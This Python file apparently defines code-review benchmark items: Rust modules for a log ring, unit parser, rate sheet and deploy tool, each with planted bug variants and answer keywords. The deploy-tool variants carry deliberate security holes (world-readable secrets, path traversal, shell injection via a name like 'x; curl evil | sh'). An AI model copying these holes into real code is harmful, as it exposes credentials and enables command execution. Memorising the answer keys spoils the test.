"""Slot modules (rust), part 1: ring log, unit parser, rate sheet, secret files."""
from fx import dd, langs

from ._slots import Bad, Module, Slot, sub, validate_module


def ctx(name, mod):
    return {"Cargo.toml": langs.cargo_toml(name), "src/lib.rs": f"pub mod {mod};\n", "README.md": f"# {name}\n"}


# ---------------------------------------------------------------------------------------------------------------------
# ring log
# ---------------------------------------------------------------------------------------------------------------------

RING_TEMPLATE = dd('''
    //! A fixed-size ring of log lines for a field logger, with a compact binary dump format.

    pub const MAX_LINE: usize = 80;

    #[derive(Debug, PartialEq)]
    pub enum DumpError {
        Truncated,
        BadUtf8,
        TooMany,
    }

    pub struct RingLog {
        lines: Vec<String>,
        cap: usize,
        next: usize,
    }

    impl RingLog {
        @@new@@

        @@push@@

        @@tail@@

        @@dump@@
    }

    @@parse@@
''')

_RG_NEW = dd('''
    /// A ring that keeps the last `cap` lines. `cap` must be at least 1.
    pub fn new(cap: usize) -> RingLog {
        assert!(cap >= 1, "capacity must be at least 1");
        RingLog { lines: Vec::with_capacity(cap), cap, next: 0 }
    }
''')
_RG_PUSH = dd('''
    /// Stores a line (cut to MAX_LINE bytes at a character boundary), overwriting the oldest line once the ring is full.
    pub fn push(&mut self, line: &str) {
        let mut end = line.len().min(MAX_LINE);
        while !line.is_char_boundary(end) {
            end -= 1;
        }
        let text = line[..end].to_string();
        if self.lines.len() < self.cap {
            self.lines.push(text);
        } else {
            self.lines[self.next] = text;
        }
        self.next = (self.next + 1) % self.cap;
    }
''')
_RG_TAIL = dd('''
    /// The newest `n` lines, oldest first (fewer if the ring holds fewer).
    pub fn tail(&self, n: usize) -> Vec<&str> {
        let len = self.lines.len();
        let n = n.min(len);
        let start = if len < self.cap { 0 } else { self.next };
        (len - n..len).map(|i| self.lines[(start + i) % len].as_str()).collect()
    }
''')
_RG_DUMP = dd('''
    /// Binary dump of the stored lines, oldest first: a big-endian u16 count, then per line one length byte and the bytes.
    pub fn dump(&self) -> Vec<u8> {
        let all = self.tail(self.lines.len());
        let mut out = Vec::new();
        out.extend_from_slice(&(all.len() as u16).to_be_bytes());
        for line in all {
            out.push(line.len() as u8);
            out.extend_from_slice(line.as_bytes());
        }
        out
    }
''')
_RG_PARSE = dd('''
    /// Reads a dump back. Never panics on malformed input: truncated data, invalid UTF-8 and counts above 4096 are errors.
    pub fn parse_dump(bytes: &[u8]) -> Result<Vec<String>, DumpError> {
        if bytes.len() < 2 {
            return Err(DumpError::Truncated);
        }
        let count = u16::from_be_bytes([bytes[0], bytes[1]]) as usize;
        if count > 4096 {
            return Err(DumpError::TooMany);
        }
        let mut pos = 2;
        let mut lines = Vec::with_capacity(count);
        for _ in 0..count {
            let len = *bytes.get(pos).ok_or(DumpError::Truncated)? as usize;
            pos += 1;
            let chunk = bytes.get(pos..pos + len).ok_or(DumpError::Truncated)?;
            lines.push(String::from_utf8(chunk.to_vec()).map_err(|_| DumpError::BadUtf8)?);
            pos += len;
        }
        Ok(lines)
    }
''')

RINGLOG = Module(
    name="rs-ringlog", lang="rust", path="src/ringlog.rs", difficulty=3,
    title="ringlog: fixed-size log ring with a binary dump format",
    blurb="The `fieldlog` crate runs on a weather-station logger with 64 KB of RAM; `ringlog` keeps its last log lines.",
    intro="The logger loses its history on every reboot. This PR adds a ring of the last lines and a dump format to keep them in flash:",
    outro="Dumps are read back by the base-station software from flash that may be corrupted. Exercised on the bench unit with 500 lines.",
    new_file=True,
    template=RING_TEMPLATE,
    ctx=ctx("fieldlog", "ringlog"),
    slots=[
        Slot("new", "RingLog::new", _RG_NEW, [
            Bad(sub(_RG_NEW, 'assert!(cap >= 1, "capacity must be at least 1");', ""), "validation", "a capacity of 0 is accepted and later panics with a division by zero in `% self.cap`", ("cap", "zero", "assert", "division")),
        ], note="adds `RingLog::new()`"),
        Slot("push", "RingLog::push", _RG_PUSH, [
            Bad(dd('''
                /// Stores a line (cut to MAX_LINE bytes at a character boundary), overwriting the oldest line once the ring is full.
                pub fn push(&mut self, line: &str) {
                    let end = line.len().min(MAX_LINE);
                    let text = line[..end].to_string();
                    if self.lines.len() < self.cap {
                        self.lines.push(text);
                    } else {
                        self.lines[self.next] = text;
                    }
                    self.next = (self.next + 1) % self.cap;
                }
            '''), "validation", "the line is cut at a byte offset that may fall inside a multi-byte character, which panics for non-ASCII text such as `°C`", ("char boundary", "panic", "utf-8", "slice")),
            Bad(_RG_PUSH.replace("self.next = (self.next + 1) % self.cap;", "self.next = self.next + 1;"), "off-by-one", "next is never wrapped around the capacity, so the first push after the ring is full indexes out of bounds and panics", ("wrap", "modulo", "% self.cap", "index")),
            Bad(_RG_PUSH.replace("line.len().min(MAX_LINE)", "line.len().min(MAX_LINE + 1)"), "off-by-one", "lines are kept up to MAX_LINE + 1 bytes", ("MAX_LINE", "+ 1", "limit")),
        ], note="adds `push()` with truncation at a character boundary"),
        Slot("tail", "RingLog::tail", _RG_TAIL, [
            Bad(sub(_RG_TAIL, "let n = n.min(len);", ""), "validation", "asking for more lines than are stored underflows `len - n` (panic in debug builds, garbage wrap-around in release)", ("underflow", "min", "len - n", "panic")),
            Bad(sub(_RG_TAIL, "let start = if len < self.cap { 0 } else { self.next };", "let start = 0;"), "logic", "once the ring has wrapped, the oldest line is at `next`, not at 0, so the lines come out in the wrong order", ("wrap", "oldest", "order", "next")),
        ], note="adds `tail()`"),
        Slot("dump", "RingLog::dump", _RG_DUMP, [
            Bad(_RG_DUMP.replace("out.push(line.len() as u8);", "out.push(line.len() as u8);").replace("let all = self.tail(self.lines.len());", "let all: Vec<&str> = self.lines.iter().map(|s| s.as_str()).collect();"), "logic", "the dump walks the backing vector in storage order instead of oldest-first, so a wrapped ring is dumped out of order", ("order", "wrap", "oldest", "tail")),
            Bad(_RG_DUMP.replace("(all.len() as u16).to_be_bytes()", "(all.len() as u16).to_le_bytes()"), "logic", "the count is written little-endian although the format (and the parser) are big-endian", ("endian", "to_be_bytes", "to_le_bytes")),
        ], note="adds `dump()`"),
        Slot("parse", "parse_dump", _RG_PARSE, [
            Bad(dd('''
                /// Reads a dump back. Never panics on malformed input: truncated data, invalid UTF-8 and counts above 4096 are errors.
                pub fn parse_dump(bytes: &[u8]) -> Result<Vec<String>, DumpError> {
                    let count = u16::from_be_bytes([bytes[0], bytes[1]]) as usize;
                    if count > 4096 {
                        return Err(DumpError::TooMany);
                    }
                    let mut pos = 2;
                    let mut lines = Vec::with_capacity(count);
                    for _ in 0..count {
                        let len = bytes[pos] as usize;
                        pos += 1;
                        let chunk = &bytes[pos..pos + len];
                        lines.push(String::from_utf8(chunk.to_vec()).map_err(|_| DumpError::BadUtf8)?);
                        pos += len;
                    }
                    Ok(lines)
                }
            '''), "validation", "the parser indexes the input directly, so truncated or corrupted flash content panics instead of returning DumpError::Truncated", ("bounds", "panic", "index", "Truncated")),
            Bad(_RG_PARSE.replace("String::from_utf8(chunk.to_vec()).map_err(|_| DumpError::BadUtf8)?", "String::from_utf8(chunk.to_vec()).unwrap()"), "error-handling", "unwrap() on the UTF-8 conversion panics on corrupted data although the function promises never to panic", ("unwrap", "utf8", "panic", "BadUtf8")),
            Bad(_RG_PARSE.replace("if count > 4096 {", "if count > 65_536 {"), "validation", "the count limit is above what a u16 can hold, so it never triggers and a corrupted header can make the parser reserve 65535 entries up front", ("4096", "limit", "count", "with_capacity")),
        ], note="adds `parse_dump()` for dumps read back from flash"),
    ],
)

# ---------------------------------------------------------------------------------------------------------------------
# quantity parser
# ---------------------------------------------------------------------------------------------------------------------

UNITS_TEMPLATE = dd('''
    //! Parses kitchen quantities such as "12.5kg", "3 lb" or "250 g" and adds them up in grams.

    #[derive(Debug, PartialEq)]
    pub enum UnitError {
        BadNumber(String),
        UnknownUnit(String),
        Overflow,
    }

    @@number@@

    @@split@@

    @@grams@@

    @@sum@@

    @@format@@
''')

_UN_NUMBER = dd('''
    /// A finite, non-negative decimal number; "nan", "inf" and negative values are rejected.
    pub fn parse_number(s: &str) -> Result<f64, UnitError> {
        let v: f64 = s.trim().parse().map_err(|_| UnitError::BadNumber(s.to_string()))?;
        if !v.is_finite() || v < 0.0 {
            return Err(UnitError::BadNumber(s.to_string()));
        }
        Ok(v)
    }
''')
_UN_SPLIT = dd('''
    /// Splits "12.5kg" or "3 lb" into the number text and the lower-cased unit text.
    pub fn split_quantity(s: &str) -> (String, String) {
        let s = s.trim();
        let cut = s.char_indices().find(|(_, c)| c.is_alphabetic()).map(|(i, _)| i).unwrap_or(s.len());
        (s[..cut].trim().to_string(), s[cut..].trim().to_lowercase())
    }
''')
_UN_GRAMS = dd('''
    /// Converts a value in the given unit to whole grams, rounding half up.
    pub fn to_grams(value: f64, unit: &str) -> Result<u64, UnitError> {
        let per_unit = match unit {
            "g" => 1.0,
            "kg" => 1000.0,
            "oz" => 28.349_523_125,
            "lb" => 453.592_37,
            _ => return Err(UnitError::UnknownUnit(unit.to_string())),
        };
        let grams = (value * per_unit).round();
        if grams > u64::MAX as f64 {
            return Err(UnitError::Overflow);
        }
        Ok(grams as u64)
    }
''')
_UN_SUM = dd('''
    /// Total grams of a list of quantities; the first error wins.
    pub fn sum_grams(items: &[&str]) -> Result<u64, UnitError> {
        let mut total: u64 = 0;
        for item in items {
            let (num, unit) = split_quantity(item);
            let grams = to_grams(parse_number(&num)?, &unit)?;
            total = total.checked_add(grams).ok_or(UnitError::Overflow)?;
        }
        Ok(total)
    }
''')
_UN_FORMAT = dd('''
    /// "1 kg 250 g", "250 g", "2 kg" or "0 g".
    pub fn format_grams(g: u64) -> String {
        let (kg, rest) = (g / 1000, g % 1000);
        match (kg, rest) {
            (0, r) => format!("{} g", r),
            (k, 0) => format!("{} kg", k),
            (k, r) => format!("{} kg {} g", k, r),
        }
    }
''')

UNITS = Module(
    name="rs-quantities", lang="rust", path="src/quantity.rs", difficulty=3,
    title="quantity: parse kitchen quantities and total them in grams",
    blurb="The `pantry` crate scales and totals recipes for a canteen's ordering system.",
    intro="Recipes arrive as free text (`250 g`, `3 lb`). This PR adds the parser and converter:",
    outro="Input comes from cooks typing into a form, so it is messy. Checked against the 40 recipes in the sample folder.",
    new_file=True,
    template=UNITS_TEMPLATE,
    ctx=ctx("pantry", "quantity"),
    slots=[
        Slot("number", "parse_number", _UN_NUMBER, [
            Bad(sub(_UN_NUMBER, "if !v.is_finite() || v < 0.0 {\nreturn Err(UnitError::BadNumber(s.to_string()));\n}", ""), "validation", "\"nan\", \"inf\" and negative numbers are accepted: Rust's f64 parser understands them", ("nan", "inf", "finite", "negative")),
            Bad(_UN_NUMBER.replace("map_err(|_| UnitError::BadNumber(s.to_string()))?", "unwrap()"), "error-handling", "unwrap() panics on any malformed number although the function returns a Result", ("unwrap", "panic", "map_err", "Result")),
            Bad(_UN_NUMBER.replace("v < 0.0", "v <= 0.0"), "off-by-one", "zero is rejected although `0 g` is a valid quantity (only negatives are invalid)", ("zero", "<=", "negative")),
        ], note="adds `parse_number()`"),
        Slot("split", "split_quantity", _UN_SPLIT, [
            Bad(dd('''
                /// Splits "12.5kg" or "3 lb" into the number text and the lower-cased unit text.
                pub fn split_quantity(s: &str) -> (String, String) {
                    let s = s.trim();
                    let cut = s.find(|c: char| c.is_alphabetic()).unwrap_or(s.len());
                    let (num, unit) = s.split_at(cut + 1);
                    (num.trim().to_string(), unit.trim().to_lowercase())
                }
            '''), "off-by-one", "split_at(cut + 1) puts the first letter of the unit into the number part (and panics when there is no unit)", ("cut + 1", "split_at", "first letter", "panic")),
            Bad(sub(_UN_SPLIT, "(s[..cut].trim().to_string(), s[cut..].trim().to_lowercase())", "(s[..cut].trim().to_string(), s[cut..].trim().to_string())"), "logic", "the unit is not lower-cased, so `KG` or `Lb` are reported as unknown units", ("lowercase", "to_lowercase", "KG", "unit")),
        ], note="adds `split_quantity()`"),
        Slot("grams", "to_grams", _UN_GRAMS, [
            Bad(_UN_GRAMS.replace("(value * per_unit).round()", "(value * per_unit).floor()"), "logic", "floor instead of round: 1.9 g becomes 1 g", ("floor", "round", "half")),
            Bad(_UN_GRAMS.replace("453.592_37", "435.592_37"), "logic", "the pound conversion factor has two digits swapped (435.59 instead of 453.59)", ("lb", "453", "435", "constant"), kind="config-error"),
            Bad(sub(_UN_GRAMS, "if grams > u64::MAX as f64 {\nreturn Err(UnitError::Overflow);\n}", ""), "validation", "values beyond u64 are not detected: `as u64` saturates silently instead of reporting Overflow", ("Overflow", "saturat", "as u64", "u64::MAX")),
        ], note="adds `to_grams()`"),
        Slot("sum", "sum_grams", _UN_SUM, [
            Bad(_UN_SUM.replace("total = total.checked_add(grams).ok_or(UnitError::Overflow)?;", "total += grams;"), "logic", "plain addition overflows: a panic in debug builds, silent wrap-around in release builds", ("checked_add", "overflow", "wrap", "panic")),
            Bad(sub(_UN_SUM, "let (num, unit) = split_quantity(item);", "let (num, unit) = split_quantity(item);\nif num.is_empty() {\n    continue;\n}"), "validation", "an item without a number (\"kg\") is silently skipped instead of being reported as BadNumber", ("skip", "continue", "empty", "BadNumber")),
        ], note="adds `sum_grams()`"),
        Slot("format", "format_grams", _UN_FORMAT, [
            Bad(_UN_FORMAT.replace("(k, 0) => format!(\"{} kg\", k),", "(k, 0) => format!(\"{} kg 0 g\", k),"), "logic", "whole kilograms are written as `2 kg 0 g` instead of `2 kg`", ("0 g", "whole", "format")),
            Bad(_UN_FORMAT.replace("let (kg, rest) = (g / 1000, g % 1000);", "let (kg, rest) = (g / 100, g % 100);"), "logic", "dividing by 100 instead of 1000 gives wrong kilogram values", ("1000", "100", "divide")),
        ], note="adds `format_grams()`"),
    ],
)

# ---------------------------------------------------------------------------------------------------------------------
# rate sheet
# ---------------------------------------------------------------------------------------------------------------------

RATES_TEMPLATE = dd('''
    //! Courier rate sheet: weight bands, the cheapest quote, discounts and per-zone totals.
    use std::collections::BTreeMap;

    #[derive(Debug, Clone, PartialEq)]
    pub struct Band {
        pub max_grams: u32,
        pub cents: u32,
    }

    #[derive(Debug, Clone, PartialEq)]
    pub struct Quote {
        pub carrier: String,
        pub zone: String,
        pub cents: u32,
    }

    @@lookup@@

    @@cheapest@@

    @@discount@@

    @@expire@@

    @@zones@@
''')

_RS_LOOKUP = dd('''
    /// Price in cents for a parcel of the given weight: the first band (bands are sorted by max_grams) that fits.
    /// A weight of 0 or one above the last band has no price.
    pub fn price_for(bands: &[Band], grams: u32) -> Option<u32> {
        if grams == 0 {
            return None;
        }
        bands.iter().find(|b| grams <= b.max_grams).map(|b| b.cents)
    }
''')
_RS_CHEAPEST = dd('''
    /// The cheapest quote; the first one wins a tie. None for an empty list.
    pub fn cheapest(quotes: &[Quote]) -> Option<&Quote> {
        let mut best: Option<&Quote> = None;
        for q in quotes {
            if best.map_or(true, |b| q.cents < b.cents) {
                best = Some(q);
            }
        }
        best
    }
''')
_RS_DISCOUNT = dd('''
    /// Cents after a percentage discount, rounded half up; percentages above 100 count as 100.
    pub fn discounted(cents: u32, pct: u32) -> u32 {
        let pct = pct.min(100) as u64;
        let off = (cents as u64 * pct * 2 + 100) / 200;
        (cents as u64 - off) as u32
    }
''')
_RS_EXPIRE = dd('''
    /// Drops the quotes whose carrier is in `suspended`, keeping the order of the others.
    pub fn drop_suspended(quotes: &mut Vec<Quote>, suspended: &[&str]) {
        quotes.retain(|q| !suspended.contains(&q.carrier.as_str()));
    }
''')
_RS_ZONES = dd('''
    /// Total cents per zone, zones in alphabetical order.
    pub fn totals_by_zone(quotes: &[Quote]) -> BTreeMap<String, u64> {
        let mut totals = BTreeMap::new();
        for q in quotes {
            *totals.entry(q.zone.clone()).or_insert(0u64) += q.cents as u64;
        }
        totals
    }
''')

RATES = Module(
    name="rs-ratesheet", lang="rust", path="src/rates.rs", difficulty=3,
    title="rates: weight bands, cheapest quote, discounts, per-zone totals",
    blurb="The `parcelhub` crate compares courier prices for a small online shop.",
    intro="Shipping prices were looked up by hand in PDFs. This PR adds the price sheet logic:",
    outro="Prices are integer cents everywhere. Compared with the carriers' public sheets for ten sample parcels.",
    new_file=True,
    template=RATES_TEMPLATE,
    ctx=ctx("parcelhub", "rates"),
    slots=[
        Slot("lookup", "price_for", _RS_LOOKUP, [
            Bad(_RS_LOOKUP.replace("grams <= b.max_grams", "grams < b.max_grams"), "off-by-one", "a parcel of exactly max_grams is moved to the next (dearer) band", ("<", "<=", "max_grams", "boundary")),
            Bad(sub(_RS_LOOKUP, "if grams == 0 {\nreturn None;\n}", ""), "validation", "a weight of 0 gets the cheapest band's price instead of no price", ("zero", "weight", "None")),
            Bad(_RS_LOOKUP.replace(".find(|b| grams <= b.max_grams)", ".rev().find(|b| grams <= b.max_grams)"), "logic", "searching the bands from the heaviest end returns the *last* band that fits, i.e. the dearest one", ("rev", "first band", "order", "last band", "heaviest", "dearest")),
        ], note="adds `price_for()`"),
        Slot("cheapest", "cheapest", _RS_CHEAPEST, [
            Bad(_RS_CHEAPEST.replace("q.cents < b.cents", "q.cents <= b.cents"), "off-by-one", "with `<=` the *last* of equally cheap quotes wins instead of the first", ("<=", "tie", "first", "last")),
            Bad(_RS_CHEAPEST.replace("q.cents < b.cents", "q.cents > b.cents"), "logic", "the comparison is reversed: the dearest quote is returned", (">", "dearest", "cheapest")),
        ], note="adds `cheapest()`"),
        Slot("discount", "discounted", _RS_DISCOUNT, [
            Bad(_RS_DISCOUNT.replace("let pct = pct.min(100) as u64;", "let pct = pct as u64;"), "validation", "a discount above 100 % makes `off` larger than `cents` and the subtraction underflows (panic in debug, huge price in release)", ("underflow", "100", "min", "panic")),
            Bad(_RS_DISCOUNT.replace("(cents as u64 * pct * 2 + 100) / 200", "cents as u64 * pct / 100"), "logic", "the discount is truncated instead of rounded half up", ("round", "truncat", "half")),
        ], note="adds `discounted()`"),
        Slot("expire", "drop_suspended", _RS_EXPIRE, [
            Bad(dd('''
                /// Drops the quotes whose carrier is in `suspended`, keeping the order of the others.
                pub fn drop_suspended(quotes: &mut Vec<Quote>, suspended: &[&str]) {
                    let mut i = 0;
                    while i < quotes.len() {
                        if suspended.contains(&quotes[i].carrier.as_str()) {
                            quotes.remove(i);
                        }
                        i += 1;
                    }
                }
            '''), "logic", "after `remove(i)` the next element shifts into slot i but i is incremented anyway, so two suspended quotes in a row leave the second one in the list", ("remove", "index", "skip", "retain")),
        ], note="adds `drop_suspended()`"),
        Slot("zones", "totals_by_zone", _RS_ZONES, [
            Bad(sub(_RS_ZONES, "*totals.entry(q.zone.clone()).or_insert(0u64) += q.cents as u64;", "totals.insert(q.zone.clone(), q.cents as u64);"), "logic", "insert overwrites the zone's running total, so only the last quote of each zone is counted", ("insert", "overwrite", "+=", "entry")),
        ], note="adds `totals_by_zone()`"),
    ],
)

# ---------------------------------------------------------------------------------------------------------------------
# secret files
# ---------------------------------------------------------------------------------------------------------------------

VAULT_TEMPLATE = dd('''
    //! Small file helpers of the deploy tool: private secret files, hook scripts and path joining under a root.

    @@imports@@

    @@secret@@

    @@join@@

    @@hook@@

    @@redact@@
''')

_VF_IMPORTS = dd('''
    use std::fs::OpenOptions;
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    use std::path::{Component, Path, PathBuf};
    use std::process::Command;
''')
_VF_SECRET = dd('''
    /// Writes a secret to `path`, creating the file readable and writable by its owner only (mode 0600).
    pub fn write_secret(path: &Path, data: &str) -> std::io::Result<()> {
        let mut f = OpenOptions::new().write(true).create(true).truncate(true).mode(0o600).open(path)?;
        f.write_all(data.as_bytes())
    }
''')
_VF_JOIN = dd('''
    /// `rel` below `root`. Absolute paths and `..` components are rejected so the result can never leave `root`.
    pub fn join_under(root: &Path, rel: &str) -> Option<PathBuf> {
        let rel = Path::new(rel);
        let mut out = root.to_path_buf();
        for c in rel.components() {
            match c {
                Component::Normal(part) => out.push(part),
                Component::CurDir => {}
                _ => return None,
            }
        }
        Some(out)
    }
''')
_VF_HOOK = dd('''
    /// Runs `hooks/<name>` (a script in the hooks directory). The name may only contain letters, digits, `-` and `_`.
    pub fn run_hook(hooks_dir: &Path, name: &str) -> std::io::Result<bool> {
        if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {
            return Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, "bad hook name"));
        }
        let status = Command::new(hooks_dir.join(name)).status()?;
        Ok(status.success())
    }
''')
_VF_REDACT = dd('''
    /// Replaces every occurrence of each secret in `line` with `***`.
    pub fn redact(line: &str, secrets: &[&str]) -> String {
        let mut out = line.to_string();
        for s in secrets {
            if !s.is_empty() {
                out = out.replace(s, "***");
            }
        }
        out
    }
''')

VAULT = Module(
    name="rs-deployfiles", lang="rust", path="src/files.rs", difficulty=4,
    title="deploy tool: private secret files, hook runner, safe path join, log redaction",
    blurb="The `shipit` crate is a small deploy tool that writes credentials, runs hook scripts and prints build logs.",
    intro="Credentials and hooks were handled by shell snippets in the deploy script. This PR moves them into the tool:",
    outro="Hook names come from `deploy.toml`, which reviewers edit in PRs; relative paths come from the same file. Tried on the staging runner.",
    new_file=True,
    template=VAULT_TEMPLATE,
    ctx=ctx("shipit", "files"),
    slots=[
        Slot("imports", "<imports>", _VF_IMPORTS, []),
        Slot("secret", "write_secret", _VF_SECRET, [
            Bad(_VF_SECRET.replace(".mode(0o600)", ".mode(0o644)"), "security", "the secret file is created world-readable (0644) instead of owner-only", ("0644", "0600", "permission", "world-readable")),
            Bad(dd('''
                /// Writes a secret to `path`, creating the file readable and writable by its owner only (mode 0600).
                pub fn write_secret(path: &Path, data: &str) -> std::io::Result<()> {
                    let mut f = OpenOptions::new().write(true).create(true).truncate(true).open(path)?;
                    f.write_all(data.as_bytes())
                }
            '''), "security", "no mode is set, so the file gets the umask default (usually 0644): readable by every user on the runner", ("mode", "permission", "umask", "0600"),
                imports=_VF_IMPORTS.replace("use std::os::unix::fs::OpenOptionsExt;\n", "")),
        ], note="adds `write_secret()`"),
        Slot("join", "join_under", _VF_JOIN, [
            Bad(dd('''
                /// `rel` below `root`. Absolute paths and `..` components are rejected so the result can never leave `root`.
                pub fn join_under(root: &Path, rel: &str) -> Option<PathBuf> {
                    Some(root.join(rel))
                }
            '''), "security", "Path::join with an absolute path replaces the root and `..` components are kept, so the result can point anywhere (path traversal)", ("traversal", "absolute", "..", "join")),
            Bad(sub(_VF_JOIN, "_ => return None,", "Component::ParentDir => {\n    out.pop();\n}\n_ => return None,"), "security", "`..` is resolved by popping the path, which can climb above the root (only absolute paths are rejected)", ("..", "ParentDir", "pop", "root")),
        ], note="adds `join_under()`"),
        Slot("hook", "run_hook", _VF_HOOK, [
            Bad(dd('''
                /// Runs `hooks/<name>` (a script in the hooks directory). The name may only contain letters, digits, `-` and `_`.
                pub fn run_hook(hooks_dir: &Path, name: &str) -> std::io::Result<bool> {
                    let status = Command::new("sh").arg("-c").arg(format!("{}/{}", hooks_dir.display(), name)).status()?;
                    Ok(status.success())
                }
            '''), "security", "the name is pasted into a shell command line with no validation, so a name like `x; curl evil | sh` runs arbitrary commands (command injection)", ("injection", "shell", "sh -c", "validate")),
            Bad(sub(_VF_HOOK, "if name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_') {\nreturn Err(std::io::Error::new(std::io::ErrorKind::InvalidInput, \"bad hook name\"));\n}", ""), "security", "the hook name is not validated, so `../../bin/anything` runs a program outside the hooks directory", ("traversal", "validate", "name", "..")),
        ], note="adds `run_hook()`"),
        Slot("redact", "redact", _VF_REDACT, [
            Bad(sub(_VF_REDACT, "out = out.replace(s, \"***\");", "out = out.replacen(s, \"***\", 1);"), "security", "only the first occurrence of each secret is masked; later ones leak into the build log", ("replacen", "first", "occurrence", "leak")),
            Bad(sub(_VF_REDACT, "if !s.is_empty() {\nout = out.replace(s, \"***\");\n}", "out = out.replace(s, \"***\");"), "logic", "an empty secret matches between every character, turning the whole line into `***` runs", ("empty", "replace", "***")),
        ], note="adds `redact()` for build logs"),
    ],
)

MODULES = [RINGLOG, UNITS, RATES, VAULT]

from ._traps import apply_traps  # noqa: E402

apply_traps(MODULES)

for _m in MODULES:
    validate_module(_m)
